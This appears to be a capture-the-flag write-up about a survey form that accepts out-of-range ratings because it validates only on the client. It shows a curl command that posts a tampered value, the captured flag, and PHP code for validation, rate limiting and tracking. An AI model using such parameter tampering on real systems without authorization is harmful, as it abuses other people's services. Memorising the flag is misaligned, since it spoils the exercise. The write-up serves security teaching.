# Survey Form Input Validation Vulnerability

## 🎯 Overview
This vulnerability demonstrates insufficient server-side validation in a survey form, allowing manipulation of POST parameters to submit invalid values that should be restricted by the form's constraints.

## 🔍 Vulnerability Details
- **Endpoint**: `/index.php?page=survey`
- **Method**: POST
- **Parameters**: 
  - `sujet`: Survey topic ID
  - `valeur`: Rating value
- **Attack Vector**: POST parameter manipulation
- **Normal Range**: 1-10 rating scale
- **Exploited Value**: 42

## ⚔️ Exploitation Process

### 1. Form Analysis
```html
<!-- Original form structure -->
<select name="valeur">
    <option value="1">1</option>
    ...
    <option value="10">10</option>
</select>
```

### 2. Parameter Manipulation
```bash
# Exploit using cURL to bypass client-side restrictions
curl 'http://x.x.x.x/index.php?page=survey#' \
  --data 'sujet=2&valeur=42' \
  | grep 'flag is'
```

### Attack Result
**Flag**: 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa

## 🛡️ Security Issues Identified
1. No server-side validation
2. Reliance on client-side validation only
3. No input range checking
4. Missing rate limiting
5. No submission tracking

## 🔒 Recommended Security Fixes

### 1. Implement Server-Side Validation
```php
class SurveyValidator {
    private $allowedRange = [1, 10];
    
    public function validateRating($value) {
        $rating = intval($value);
        if ($rating < $this->allowedRange[0] || 
            $rating > $this->allowedRange[1]) {
            throw new InvalidArgumentException(
                'Rating must be between 1 and 10'
            );
        }
        return $rating;
    }
}
```

### 2. Rate Limiting Implementation
```php
class RateLimiter {
    private $redis;
    private $maxAttempts = 5;
    private $timeWindow = 3600; // 1 hour
    
    public function checkLimit($ipAddress) {
        $key = "survey_submission:{$ipAddress}";
        $attempts = $this->redis->incr($key);
        
        if ($attempts === 1) {
            $this->redis->expire($key, $this->timeWindow);
        }
        
        return $attempts <= $this->maxAttempts;
    }
}
```

### 3. Submission Tracking
```php
class SurveySubmission {
    public function recordSubmission($userId, $surveyId) {
        $stmt = $this->db->prepare("
            INSERT INTO survey_submissions 
            (user_id, survey_id, submission_date, ip_address)
            VALUES (?, ?, NOW(), ?)
        ");
        return $stmt->execute([
            $userId, 
            $surveyId, 
            $_SERVER['REMOTE_ADDR']
        ]);
    }
}
```

### 4. Security Measures Checklist
- [ ] Implement server-side validation
- [ ] Add rate limiting
- [ ] Track submissions by IP/user
- [ ] Validate all input parameters
- [ ] Implement CSRF protection
- [ ] Add logging mechanisms
- [ ] Set up monitoring alerts

## 📝 Best Practices

### Form Security
1. Always validate on server-side
2. Implement CSRF tokens
3. Rate limit submissions
4. Log suspicious activities
5. Track submission patterns

### Input Validation Example
```php
function processSurveySubmission($data) {
    // Validate topic ID
    if (!in_array($data['sujet'], $this->validTopics)) {
        throw new InvalidArgumentException('Invalid topic');
    }
    
    // Validate rating value
    if (!is_numeric($data['valeur']) || 
        $data['valeur'] < 1 || 
        $data['valeur'] > 10) {
        throw new InvalidArgumentException('Invalid rating');
    }
    
    // Check for duplicate submissions
    if ($this->hasRecentSubmission($_SERVER['REMOTE_ADDR'])) {
        throw new Exception('Too many submissions');
    }
}
```

## 📚 Additional Resources
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [Rate Limiting Best Practices](https://www.nginx.com/blog/rate-limiting-nginx/)
- [Form Security Guidelines](https://www.owasp.org/index.php/Web_Application_Security_Testing_Guide)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.